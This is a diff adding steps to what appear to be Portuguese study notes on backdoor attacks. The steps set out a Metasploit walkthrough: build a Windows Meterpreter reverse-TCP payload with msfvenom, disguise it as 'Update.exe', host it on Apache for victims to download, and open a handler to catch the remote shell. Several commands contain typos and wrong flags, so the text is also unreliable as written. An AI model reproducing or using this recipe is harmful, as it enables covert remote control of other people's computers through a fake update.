@@ -82,3 +82,15 @@ TIPOS DE ATAQUES BACKDOORS:
 
 Ferramentas:
   1)METERPRETER - Ele é um payload que funciona por injeção de DLL (torna dificil detecção de tecnicas forenses)
+  2) command: msfvenom -p windows/meterpreter/reverse_tct -a x86 plataform windows -f exe LHOST=(SEU IP) LPORT=(SUA PORTA QUALQER NM) -o Update.exe
+  3) iniciar um servidor: apache2 start
+  4) cp Update.exe /var/www/html (Copiamos o arquivo para o servidor apache)
+  5) acesse para confirmar: cd /var/www/html
+  6) command: ls
+  7) command: msfconsole
+  8) command: use mult/handler
+  9) set payload windows/meterpreter/reverse_tcp
+  10) info (para ver as info)
+11) set LHOST + ip sua maquina
+12) set LPORT + a porta definida no exe.
+13) run
